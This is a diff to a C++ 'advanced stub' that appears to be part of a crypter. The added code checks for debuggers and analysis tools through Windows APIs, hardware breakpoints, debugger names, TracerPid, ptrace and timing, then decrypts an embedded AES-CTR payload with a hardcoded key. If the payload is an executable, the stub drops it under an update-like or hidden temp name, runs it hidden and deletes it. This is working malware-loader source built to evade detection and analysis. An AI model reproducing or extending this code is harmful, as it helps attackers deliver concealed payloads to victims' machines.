@@ -10,6 +10,13 @@
 #include <ctime>
 #include <chrono>
 #include <thread>
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/stat.h>
+#endif
 
 // Standalone Advanced Stub - Anti-debugging + Polymorphism
 const std::string KEY_e__EEYAB = "659a31e75604c48d75f41f25f8c37f75";
@@ -39,18 +46,67 @@ public:
 // Anti-debugging checks
 bool isDebuggerPresent() {
     #ifdef _WIN32
-    return IsDebuggerPresent();
+    // Multiple Windows anti-debug checks
+    if (IsDebuggerPresent()) return true;
+    
+    // Check PEB for debugger
+    BOOL isDebugged = FALSE;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
+    if (isDebugged) return true;
+    
+    // Check for hardware breakpoints
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (GetThreadContext(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
+    }
+    
+    // Check for common debugger processes
+    const char* debuggers[] = {"ollydbg.exe", "x64dbg.exe", "windbg.exe", "idaq.exe", "idaq64.exe"};
+    for (const auto& dbg : debuggers) {
+        if (GetModuleHandleA(dbg) != NULL) return true;
+    }
+    
+    return false;
     #else
+    // Linux anti-debug checks
+    char buf[4096];
+    FILE* f = fopen("/proc/self/status", "r");
+    if (f) {
+        while (fgets(buf, sizeof(buf), f)) {
+            if (strstr(buf, "TracerPid:") && atoi(buf + 10) != 0) {
+                fclose(f);
+                return true;
+            }
+        }
+        fclose(f);
+    }
+    
+    // Check for ptrace
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
+        return true;
+    } else {
+        ptrace(PTRACE_DETACH, 0, 1, 0);
+    }
+    
     return false;
     #endif
 }
 
 bool checkTiming() {
     auto start = std::chrono::high_resolution_clock::now();
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    
+    // Perform some operations that should take predictable time
+    volatile int dummy = 0;
+    for (int i = 0; i < 1000000; i++) {
+        dummy += i;
+    }
+    
     auto end = std::chrono::high_resolution_clock::now();
-    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
-    return duration.count() < 95; // If too fast, likely debugger
+    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
+    
+    // If execution is too slow (single-stepping) or too fast (skipped), likely debugger
+    return duration.count() < 100 || duration.count() > 50000;
 }
 
 // AES-128-CTR implementation (same as basic)
@@ -195,14 +251,15 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
     }
 }
 
+// Embedded encrypted data (will be populated by linker)
+extern unsigned char embeddedData[];
+extern size_t embeddedDataSize;
+
 int main() {
     // Anti-debugging checks
     if (isDebuggerPresent() || checkTiming()) {
         return 1; // Exit if debugger detected
     }
-    
-    // Standalone stub - no embedded data
-    // Standalone stub - no embedded data}
     
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
@@ -214,24 +271,65 @@ int main() {
     PolymorphicEngine::mutateArray(key, 16, seed);
     PolymorphicEngine::mutateArray(nonce, 16, seed);
     
+    // Create buffer for decrypted data
+    std::vector<uint8_t> decryptedData(embeddedDataSize);
+    std::memcpy(decryptedData.data(), embeddedData, embeddedDataSize);
+    
     // Decrypt the data using AES-128-CTR
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    aesCtrCrypt(decryptedData.data(), decryptedData.data(), embeddedDataSize, key, nonce);
     
     // Demutate the key and nonce
     PolymorphicEngine::demutateArray(key, 16, seed);
     PolymorphicEngine::demutateArray(nonce, 16, seed);
     
-    // Write decrypted data to file
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
-    // if (outFile.is_open()) {
-    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
-        outFile.close();
-        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    // Check if it's an executable
+    bool isExe = (embeddedDataSize > 2 && decryptedData[0] == 'M' && decryptedData[1] == 'Z');
+    
+    if (isExe) {
+        #ifdef _WIN32
+        // Execute on Windows
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        std::string exePath = std::string(tempPath) + "upd" + std::to_string(GetTickCount()) + ".exe";
+        
+        std::ofstream exe(exePath, std::ios::binary);
+        if (exe.is_open()) {
+            exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            exe.close();
+            
+            // Execute with ShellExecute for better compatibility
+            ShellExecuteA(NULL, "open", exePath.c_str(), NULL, NULL, SW_HIDE);
+            
+            // Clean up after delay
+            Sleep(2000);
+            DeleteFileA(exePath.c_str());
+        }
+        #else
+        // Execute on Linux
+        std::string tmpPath = "/tmp/." + std::to_string(getpid()) + std::to_string(seed);
+        std::ofstream exe(tmpPath, std::ios::binary);
+        if (exe.is_open()) {
+            exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            exe.close();
+            chmod(tmpPath.c_str(), 0755);
+            
+            if (fork() == 0) {
+                execl(tmpPath.c_str(), tmpPath.c_str(), NULL);
+                exit(0);
+            }
+            
+            sleep(2);
+            unlink(tmpPath.c_str());
+        }
+        #endif
     } else {
-        std::cerr << "Failed to create output file" << std::endl;
-        return 1;
+        // Write non-executable data
+        std::string filename = "data_" + std::to_string(seed) + ".bin";
+        std::ofstream outFile(filename, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            outFile.close();
+        }
     }
     
     return 0;
